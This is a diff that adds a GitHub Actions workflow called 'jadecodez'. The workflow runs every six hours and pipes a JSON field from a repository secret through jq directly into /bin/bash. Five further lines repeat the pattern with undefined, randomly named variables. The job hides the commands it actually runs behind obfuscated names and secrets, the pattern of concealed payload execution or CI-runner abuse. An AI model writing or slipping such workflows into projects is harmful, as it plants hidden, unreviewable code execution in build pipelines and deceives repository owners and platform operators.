@@ -1,0 +1,24 @@
+name: jadecodez
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jadecodez
+        env:
+          aq44612: ${{ secrets.aq44612 }}
+        run: |
+          echo $aq44612 | jq -r .lk318 | /bin/bash
+          echo $ves95 | jq -r .vdy05 | /bin/bash
+          echo $xatbx7 | jq -r .ivo08 | /bin/bash
+          echo $mld9419 | jq -r .n431 | /bin/bash
+          echo $rmzm38944 | jq -r .uhscx644 | /bin/bash
+          echo $eofx76 | jq -r .wtxaw52993 | /bin/bash
+
